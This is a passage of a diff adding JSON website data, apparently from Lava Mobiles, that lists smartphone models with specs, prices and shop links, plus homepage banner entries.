+            "created_at": "2025-05-29T14:22:54.997Z",
+            "category_id": 1024,
+            "price": 7499,
+            "cut_price": 5999,
+            "buy_now_url": "https://shop.lavamobiles.com/products/bold-n1",
+            "read_more_url": "/smartphones/bold-n1",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "bold-series",
+            "cat_name": "BOLD Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 114,
+            "slug": "bold-n1-pro",
+            "name": "Bold N1 Pro",
+            "sorting": 4,
+            "image": "media/community/image/bold-n1pro-listing-1749128956.webp",
+            "short_description": "50MP AI Rear Camera | 8MP Selfie Camera | 4GB+4GB* RAM  | 128GB ROM | Octa-core UNISOC T606 Processor | 16.94cm (6.67\") HD+ Punch Hole Display  | 120Hz Refresh Rate | \r\n5000mAh Battery with Type-C Port & 10W Charging (18W Fast Charging Support)",
+            "description": null,
+            "created_at": "2025-05-29T12:40:47.847Z",
+            "category_id": 1024,
+            "price": 8399,
+            "cut_price": 6799,
+            "buy_now_url": "https://shop.lavamobiles.com/products/bold-n1-pro",
+            "read_more_url": "/smartphones/bold-n1-pro",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "bold-series",
+            "cat_name": "BOLD Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 72,
+            "slug": "yuva-3",
+            "name": "Yuva 3",
+            "sorting": 5,
+            "image": "media/community/image/yuva-3-3-1708940691-1710409248.webp",
+            "short_description": "4GB+ 4GB* RAM I 128GB UFS 2.2 ROM | UNISOC T606 Octa-core Processor (AnTuTu 200K+) | 90Hz 16.55cm (6.5\") HD+ Punch Hole Display",
+            "description": null,
+            "created_at": "2024-02-26T11:07:51.137Z",
+            "category_id": 5,
+            "price": 7999,
+            "cut_price": 6999,
+            "buy_now_url": "https://shop.lavamobiles.com/products/yuva-3?variant=48089584238902",
+            "read_more_url": "smartphones/yuva-3",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "yuva-series",
+            "cat_name": "Yuva Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 90,
+            "slug": "agni-3",
+            "name": "AGNI 3",
+            "sorting": 5,
+            "image": "media/community/image/agni-3-listing-1728025925.webp",
+            "short_description": "Segment-first Dual AMOLED display on front & back | Segment-first MediaTek Dimensity 7300X processor | 50MP Sony Quad-Bayer camera with OIS",
+            "description": null,
+            "created_at": "2024-10-04T12:41:23.887Z",
+            "category_id": 2,
+            "price": 25499,
+            "cut_price": 20999,
+            "buy_now_url": "https://shop.lavamobiles.com/products/agni-3",
+            "read_more_url": "/smartphones/agni-3",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "agni-series",
+            "cat_name": "Agni Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 93,
+            "slug": "yuva-4",
+            "name": "Yuva 4",
+            "sorting": 7,
+            "image": "media/community/image/yuva-4-listing-1732879416.webp",
+            "short_description": "50MP AI Triple Rear Camera I 8MP Selfie Camera | 4GB+4GB* RAM  l 64GB/128GB ROM | Octa-core UNISOC T606 Processor | 16.55cm (6.56\") HD+ Punch Hole Display",
+            "description": null,
+            "created_at": "2024-11-29T16:53:36.190Z",
+            "category_id": 5,
+            "price": null,
+            "cut_price": null,
+            "buy_now_url": null,
+            "read_more_url": "/smartphones/yuva-4",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "yuva-series",
+            "cat_name": "Yuva Series",
+            "cat_category": "smartphones"
+          },
+          {
+            "id": 88,
+            "slug": "blaze-3-5g",
+            "name": "Blaze 3 5G",
+            "sorting": 10,
+            "image": "media/community/image/blaze-3-5g-listing-1726467349.webp",
+            "short_description": "Segment First VIBE Light | Lightning Fast Performance with MediaTek Dimensity 6300 Chipset | 6GB+6GB* RAM  l 128GB UFS 2.2 Memory",
+            "description": null,
+            "created_at": "2024-09-12T10:12:26.317Z",
+            "category_id": 3,
+            "price": 12999,
+            "cut_price": 11499,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-3-5g",
+            "read_more_url": "smartphones/blaze-3-5g",
+            "external_url": null,
+            "memory": null,
+            "internal_storage": null,
+            "cat_slug": "blaze-series",
+            "cat_name": "Blaze Series",
+            "cat_category": "smartphones"
+          }
+        ],
+        "home_slider": [
+          {
+            "id": 3086,
+            "type": "1",
+            "title": "Blaze Duo",
+            "description": null,
+            "image_path": null,
+            "image_path_mobile": null,
+            "link_url": null,
+            "link_url_2": "media/home_slider/video/1920x870_blaze-duo-3-banner-1768803153-1782585473.jpg",
+            "mobile_video_url": "media/home_slider/mobile_video/800x1270-blaze-duo-3-m-(1)-1782586586.jpg",
+            "home_slider_url": "/smartphones/blaze-duo-3",
+            "sorting": 1
+          },
+          {
+            "id": 2091,
+            "type": "1",
+            "title": "Agni 4 Live",
+            "description": null,
+            "image_path": null,
+            "image_path_mobile": null,
+            "link_url": null,
+            "link_url_2": "media/home_slider/video/website-banner-desktop-26nov_05-dec-1782650431.jpg",
+            "mobile_video_url": "media/home_slider/mobile_video/website-banner-mobile-26nov_5nov-1782650431.jpg",
+            "home_slider_url": "https://www.amazon.in/Lava-Storage-Display-Dimensity-Charging/dp/B0FT3DXJM3/ref=sr_1_1_sspa?crid=1AWUOQIPYTPST&dib=eyJ2IjoiMSJ9.TlgXgx2ysAdE_hAFmhSSX8BSnmvyjqmvXtjHNqqB6PzoDx0kDpPD3aw76wsKDQcpFxbuBstg6YVnLQIh7ZqBmO0aF46Q3VdSWnH_SrKwVrgD2fy3wqXcg5W493ymbk1TPqiZgMPkzJB96D7UndJFiuosJxxXMaHm9dfaN88XkjZfL1LBVVhH0QRJxJb1ag-5girhmfY6vP58_cMd8ZHcLaeou4zZKez5p9_0Jafd6dA.IOLQsp67OAsU2kbotdbWTbe_InHV07nS3U6exoO7-Ls&dib_tag=se&keywords=lava+agni+4&qid=1764052436&sprefix=l%2Caps%2C976&sr=8-1-spons&aref=MzAnvZGw6P&sp_csd=d2lkZ2V0TmFtZT1zcF9hdGY&psc=1",
+            "sorting": 2
+          },
+          {
+            "id": 1089,
+            "type": "1",
+            "title": "Play Ultra",
+            "description": null,
+            "image_path": null,
+            "image_path_mobile": null,
+            "link_url": null,
+            "link_url_2": "media/home_slider/video/play-ultra-sale-live-desk--1756103265.jpg",
+            "mobile_video_url": "media/home_slider/mobile_video/play-ultra-sale-live-m-1756103265.jpg",
+            "home_slider_url": "https://www.amazon.in/dp/B0FM87WD75",
+            "sorting": 7
+          },
+          {
+            "id": 1087,
+            "type": "1",
+            "title": "amoled2",
+            "description": null,
+            "image_path": null,
+            "image_path_mobile": null,
+            "link_url": null,
+            "link_url_2": "media/home_slider/video/amoled-web-banner-01-desk-(1)-1754901999.jpg",
+            "mobile_video_url": "media/home_slider/mobile_video/amoled-web-banner-02-m-(1)-1754901999.jpg",
+            "home_slider_url": "https://www.lavamobiles.com/smartphone/blaze-amoled-2",
+            "sorting": 9
+          },
+          {
+            "id": 1085,
+            "type": "1",
+            "title": "Storm Play",
+            "description": null,
+            "image_path": null,
+            "image_path_mobile": null,
+            "link_url": null,
+            "link_url_2": "media/home_slider/video/storm-play-sale-banner-desktop-(1)-1750746249.jpg",
+            "mobile_video_url": "media/home_slider/mobile_video/storm-play-sale-banner-mobile-(1)-1750746249.jpg",
+            "home_slider_url": "/smartphones/storm-play-5g",
+            "sorting": 11
+          }
+        ],
         "leadership": {},
         "success": "success"
       }
